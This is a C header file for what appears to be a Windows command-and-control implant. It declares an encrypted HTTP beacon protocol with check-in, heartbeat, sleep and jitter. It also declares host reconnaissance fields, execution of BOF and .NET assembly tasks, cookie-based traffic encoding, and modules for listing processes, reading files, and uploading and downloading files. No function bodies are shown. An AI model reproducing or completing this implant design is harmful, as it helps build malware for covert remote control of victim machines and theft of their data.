/*
 * agent.h — Core declarations for the C agent.
 * Includes all type definitions, protocol constants, and function prototypes.
 */
#ifndef AGENT_H
#define AGENT_H

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <bcrypt.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "config.h"

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "winhttp.lib")

/* ─── Status codes ─── */
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

/* ─── BCrypt GCM auth info (define if missing from MinGW headers) ─── */
#ifndef BCRYPT_INIT_AUTH_MODE_INFO
typedef struct _BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
    ULONG cbSize;
    ULONG dwInfoVersion;
    PUCHAR pbNonce;
    ULONG cbNonce;
    PUCHAR pbAuthData;
    ULONG cbAuthData;
    PUCHAR pbTag;
    ULONG cbTag;
    PUCHAR pbMacContext;
    ULONG cbMacContext;
    ULONG cbAAD;
    ULONGLONG cbData;
    ULONG dwFlags;
} BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO;

#define BCRYPT_INIT_AUTH_MODE_INFO(ai) do { \
    memset(&(ai), 0, sizeof(ai)); \
    (ai).cbSize = sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO); \
    (ai).dwInfoVersion = 1; \
} while(0)
#endif

/* ─── Protocol constants ─── */
#define HEADER_SIZE     12  /* MAGIC(4) + SIZE(4) + MSG_ID(4) */
#define NONCE_SIZE      12
#define TAG_SIZE        16
#define KEY_SIZE        32
#define UUID_SIZE       16
#define ECDH_PUBKEY_SIZE 65 /* 0x04 + X(32) + Y(32) */

/* Command bytes */
#define CMD_CHECKIN_REQUEST   0x01
#define CMD_CHECKIN_RESPONSE  0x02
#define CMD_TASK_RESULT       0x03
#define CMD_TASK_RESULT_ACK   0x04
#define CMD_KEY_EXCHANGE_INIT 0x10
#define CMD_KEY_EXCHANGE_RESP 0x11
#define CMD_HEARTBEAT         0x20
#define CMD_HEARTBEAT_ACK     0x21
#define CMD_TERMINATE         0xFF

/* TLV type codes */
#define TLV_AGENT_ID          0x0001
#define TLV_HOSTNAME          0x0002
#define TLV_USERNAME          0x0003
#define TLV_PID               0x0004
#define TLV_PPID              0x0005
#define TLV_ARCH              0x0006
#define TLV_OS_VERSION        0x0007
#define TLV_INTEGRITY         0x0008
#define TLV_IS_ADMIN          0x0009
#define TLV_PROCESS_NAME      0x000A
#define TLV_DOTNET_VERSION    0x000B
#define TLV_AGENT_VERSION     0x000C
#define TLV_CWD               0x000D

#define TLV_TASK_ID           0x0100
#define TLV_TASK_TYPE         0x0101
#define TLV_MODULE_NAME       0x0102
#define TLV_TASK_PAYLOAD      0x0103
#define TLV_TASK_ARGUMENTS    0x0104
#define TLV_TASK_TIMEOUT      0x0105

#define TLV_RESULT_STATUS     0x0200
#define TLV_RESULT_OUTPUT     0x0201
#define TLV_RESULT_ERROR_MSG  0x0202

#define TLV_CONFIG_SLEEP      0x0300
#define TLV_CONFIG_JITTER     0x0301

/* Task types */
#define TASK_NATIVE   0x01
#define TASK_BOF      0x02
#define TASK_ASSEMBLY 0x03
#define TASK_CONFIG   0x10
#define TASK_EXIT     0xFF

/* Architecture codes */
#define ARCH_X86  0x01
#define ARCH_X64  0x02

/* Integrity levels */
#define INTEGRITY_LOW     0
#define INTEGRITY_MEDIUM  1
#define INTEGRITY_HIGH    2
#define INTEGRITY_SYSTEM  3

/* ─── Data structures ─── */

/* Dynamic byte buffer */
typedef struct {
    unsigned char *data;
    DWORD len;
    DWORD cap;
} Buffer;

/* Parsed task from server */
typedef struct {
    unsigned char task_id[UUID_SIZE];
    BYTE task_type;
    char module_name[128];
    unsigned char *payload;
    DWORD payload_len;
    unsigned char *arguments;
    DWORD arguments_len;
    DWORD timeout;
} Task;

/* Agent state */
typedef struct {
    unsigned char agent_id[UUID_SIZE];
    unsigned char session_key[KEY_SIZE];
    BOOL has_session_key;
    ULONGLONG nonce_counter;  /* even counters for agent */
    DWORD msg_id;
    int sleep_ms;
    int jitter_pct;
    BOOL running;
} AgentState;

/* ─── Buffer helpers ─── */
void buf_init(Buffer *b, DWORD initial_cap);
void buf_append(Buffer *b, const void *data, DWORD len);
void buf_free(Buffer *b);
void buf_reset(Buffer *b);

/* ─── utils.c — Base64 ─── */
char *base64url_encode(const unsigned char *data, DWORD len, DWORD *out_len);
unsigned char *base64url_decode(const char *data, DWORD len, DWORD *out_len);
char *base64_encode(const unsigned char *data, DWORD len, DWORD *out_len);
unsigned char *base64_decode(const char *data, DWORD len, DWORD *out_len);

/* ─── protocol.c — TLV & packet ─── */
void tlv_add_raw(Buffer *b, USHORT type, const void *value, DWORD len);
void tlv_add_string(Buffer *b, USHORT type, const char *str);
void tlv_add_uint32(Buffer *b, USHORT type, DWORD value);
void tlv_add_uint8(Buffer *b, USHORT type, BYTE value);
void tlv_add_uuid(Buffer *b, USHORT type, const unsigned char *uuid);

/* TLV iteration */
typedef struct {
    USHORT type;
    const unsigned char *value;
    DWORD length;
} TlvEntry;

BOOL tlv_iter(const unsigned char *data, DWORD data_len, DWORD *offset, TlvEntry *entry);
const unsigned char *tlv_find(const unsigned char *data, DWORD data_len, USHORT type, DWORD *out_len);
DWORD tlv_find_uint32(const unsigned char *data, DWORD data_len, USHORT type, DWORD default_val);
BYTE tlv_find_uint8(const unsigned char *data, DWORD data_len, USHORT type, BYTE default_val);
const char *tlv_find_string(const unsigned char *data, DWORD data_len, USHORT type);

/* Packet framing */
void packet_pack(Buffer *out, const unsigned char *encrypted, DWORD enc_len,
                 DWORD msg_id, DWORD magic);
BOOL packet_unpack_header(const unsigned char *data, DWORD data_len,
                          DWORD *magic, DWORD *size, DWORD *msg_id);

/* Command layer */
void command_pack(Buffer *out, BYTE cmd, const unsigned char *body, DWORD body_len);
BOOL command_unpack(const unsigned char *data, DWORD data_len,
                    BYTE *cmd, const unsigned char **body, DWORD *body_len);

/* ─── crypto.c ─── */
BOOL crypto_init(void);
void crypto_cleanup(void);

/* AES-256-GCM */
BOOL aes_gcm_encrypt(const unsigned char *key, const unsigned char *nonce,
                     const unsigned char *plaintext, DWORD pt_len,
                     unsigned char **out, DWORD *out_len);
BOOL aes_gcm_decrypt(const unsigned char *key,
                     const unsigned char *data, DWORD data_len,
                     unsigned char **out, DWORD *out_len);

/* Nonce management */
void make_nonce(const unsigned char *agent_id_prefix, ULONGLONG counter,
                unsigned char *nonce_out);

/* ECDH P-256 */
BOOL ecdh_generate_keypair(unsigned char *pub_out /* 65 bytes */,
                           BCRYPT_KEY_HANDLE *priv_out);
BOOL ecdh_derive_shared_secret(BCRYPT_KEY_HANDLE priv_key,
                               const unsigned char *peer_pub /* 65 bytes */,
                               unsigned char *secret_out /* 32 bytes */);
void ecdh_free_key(BCRYPT_KEY_HANDLE key);

/* HKDF-SHA256 */
BOOL hkdf_sha256(const unsigned char *ikm, DWORD ikm_len,
                 const unsigned char *salt, DWORD salt_len,
                 const unsigned char *info, DWORD info_len,
                 unsigned char *okm, DWORD okm_len);

/* HMAC-SHA256 */
BOOL hmac_sha256(const unsigned char *key, DWORD key_len,
                 const unsigned char *data, DWORD data_len,
                 unsigned char *out /* 32 bytes */);

/* RSA-OAEP-SHA256 encrypt */
BOOL rsa_encrypt(const unsigned char *modulus, DWORD mod_len,
                 const unsigned char *exponent, DWORD exp_len,
                 const unsigned char *plaintext, DWORD pt_len,
                 unsigned char **out, DWORD *out_len);

/* ─── channel.c — HTTP ─── */
BOOL http_init(void);
void http_cleanup(void);
BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
                    unsigned char **response, DWORD *response_len);

/* Profile transforms */
char *profile_encode_request(const unsigned char *packet, DWORD packet_len, DWORD *cookie_len);
unsigned char *profile_decode_response(const char *body, DWORD body_len, DWORD *out_len);

/* ─── modules.c ─── */
void sysinfo_collect(Buffer *tlv_out);
BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
                    unsigned char **result, DWORD *result_len);

/* Module implementations */
void mod_whoami(Buffer *out);
void mod_ps(Buffer *out);
void mod_ls(Buffer *out, const char *path);
void mod_cat(Buffer *out, const char *path);
void mod_upload(Buffer *out, const char *path, const unsigned char *data, DWORD data_len);
void mod_download(Buffer *out, const char *path);

/* ─── main.c ─── */
BOOL agent_init(AgentState *state);
BOOL agent_key_exchange(AgentState *state);
BOOL agent_checkin(AgentState *state);
void agent_run(AgentState *state);

#endif /* AGENT_H */
